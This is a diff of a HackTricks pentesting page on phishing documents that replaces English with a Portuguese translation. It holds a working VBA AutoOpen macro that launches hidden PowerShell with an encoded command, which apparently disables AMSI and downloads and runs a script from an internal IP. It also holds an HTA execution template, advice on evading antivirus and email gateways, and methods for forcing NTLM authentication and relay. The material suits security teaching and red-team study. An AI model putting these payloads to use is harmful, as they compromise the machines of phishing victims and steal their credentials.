@@ -1,53 +1,50 @@
-# Phishing Files & Documents
+## Arquivos e Documentos de Phishing
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## Office Documents
+## Documentos do Office
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+O Microsoft Word realiza a validação dos dados do arquivo antes de abri-lo. A validação dos dados é realizada na forma de identificação da estrutura de dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura de dados, o arquivo em análise não será aberto.
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão do arquivo e ainda manter suas capacidades de execução de macro.\
+Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
+Os mesmos internos e mecanismos se aplicam a todos os softwares do Microsoft Office Suite (Excel, PowerPoint etc.).
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
-
+Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
+Arquivos DOCX que fazem referência a um modelo remoto (Arquivo - Opções - Suplementos - Gerenciar: Modelos - Ir) que inclui macros podem "executar" macros também.
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+### Carregamento de imagem externa
 
-### External Image Load
-
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+Vá para: _Inserir --> Partes rápidas --> Campo_\
+_**Categorias**: Links e Referências, **Nomes de campo**: includePicture, e **Nome do arquivo ou URL**:_ http://\<ip>/qualquercoisa
 
 ![](<../../.gitbook/assets/image (316).png>)
 
-### Macros Backdoor
+### Backdoor de Macros
 
-It's possible to use macros to run arbitrary code from the document.
+É possível usar macros para executar código arbitrário a partir do documento.
 
-#### Autoload functions
+#### Funções de Autocarregamento
 
-The more common they are, the more probable the AV will detect them.
+Quanto mais comuns forem, mais provável é que o AV as detecte.
 
 * AutoOpen()
 * Document\_Open()
 
-#### Macros Code Examples
-
+#### Exemplos de Código de Macros
 ```vba
 Sub AutoOpen()
     CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -77,28 +74,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
+#### Remover manualmente metadados
 
-#### Manually remove metadata
+Vá em **Arquivo > Informações > Verificar Documento > Verificar Documento**, o que abrirá o Inspector de Documentos. Clique em **Verificar** e depois em **Remover Tudo** ao lado de **Propriedades do Documento e Informações Pessoais**.
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+#### Extensão Doc
 
-#### Doc Extension
+Quando terminar, selecione o menu suspenso **Salvar como tipo**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
+Faça isso porque você **não pode salvar macros dentro de um `.docx`** e há um **estigma** em torno da extensão macro-habilitada **`.docm`** (por exemplo, o ícone da miniatura tem um enorme `!` e alguns gateways web/email os bloqueiam completamente). Portanto, esta **extensão legada `.doc` é o melhor compromisso**.
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
-
-#### Malicious Macros Generators
+#### Geradores de Macros Maliciosas
 
 * MacOS
   * [**macphish**](https://github.com/cldrn/macphish)
   * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## Arquivos HTA
 
-An HTA is a proprietary Windows program whose **source code consists of HTML and one or more scripting languages** supported by Internet Explorer (VBScript and JScript). HTML is used to generate the user interface and the scripting language for the program logic. An **HTA executes without the constraints of the browser's security model**, so it executes as a "fully trusted" application.
+Um HTA é um programa proprietário do Windows cujo **código-fonte consiste em HTML e uma ou mais linguagens de script** suportadas pelo Internet Explorer (VBScript e JScript). O HTML é usado para gerar a interface do usuário e a linguagem de script para a lógica do programa. Um **HTA é executado sem as restrições do modelo de segurança do navegador**, portanto, é executado como um aplicativo "totalmente confiável".
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
-
+Um HTA é executado usando o **`mshta.exe`**, que é normalmente **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Portanto, se ele foi desinstalado, os HTAs não poderão ser executados.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -153,12 +148,11 @@ An HTA is executed using **`mshta.exe`**, which is typically **installed** along
 	self.close
 </script>
 ```
+## Forçando a Autenticação NTLM
 
-## Forcing NTLM Authentication
+Existem várias maneiras de **forçar a autenticação NTLM "remotamente"**, por exemplo, você pode adicionar **imagens invisíveis** a e-mails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas para **abrir a pasta**.
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
-
-**Check these ideas and more in the following pages:**
+**Confira essas ideias e mais nas seguintes páginas:**
 
 {% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
@@ -170,19 +164,19 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 
 ### NTLM Relay
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+Não se esqueça que você não só pode roubar o hash ou a autenticação, mas também **realizar ataques de relé NTLM**:
 
-* [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-* [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+* [**Ataques de relé NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+* [**AD CS ESC8 (relé NTLM para certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
